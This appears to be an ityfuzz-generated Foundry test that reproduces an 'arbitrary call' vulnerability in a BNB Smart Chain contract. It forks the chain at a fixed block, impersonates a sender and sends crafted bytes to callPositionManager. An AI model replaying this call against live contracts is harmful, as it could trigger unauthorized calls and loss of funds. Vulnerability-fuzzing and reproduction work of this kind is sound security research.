// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0x55d398326f99059fF775485246999027B3197955,0x7BA5dd9Bb357aFa2231446198c75baC17CEfCda9,0x13f4EA83D0bd40E75C8222255bc855a974568Dd4,0x5542958FA9bD89C96cB86D1A6Cb7a3e644a3d46e,0x98e241bd3be918e0d927af81b430be00d86b04f9,0x7ba5dd9bb357afa2231446198c75bac17cefcda9 -c bsc --onchain-block-number 29199610 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Oracle ================
Arbitrary call from "0x13f4ea83d0bd40e75c8222255bc855a974568dd4" to 0x46a15b0b27311cedf172ab29e4f4766fbe7f4364
================ Trace ================
[Sender] 0xe1A425f1AC34A8a441566f93c82dD730639c8510
   ├─[1] 0x13f4EA83D0bd40E75C8222255bc855a974568Dd4.callPositionManager(0xd900feffd2c3f9f9f9f9f9f9f9ffffffffffffff)
   │  │  └─ ← ()


 */

contract C55d3 is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 29199610);
    }

    function test() public {

        vm.prank(0xe1A425f1AC34A8a441566f93c82dD730639c8510);
        
        0x13f4EA83D0bd40E75C8222255bc855a974568Dd4.call(abi.encodeWithSignature(
            "callPositionManager(bytes)",0xd900feffd2c3f9f9f9f9f9f9f9ffffffffffffff
        )); 
    }

    // Stepping with return
    receive() external payable {}
}

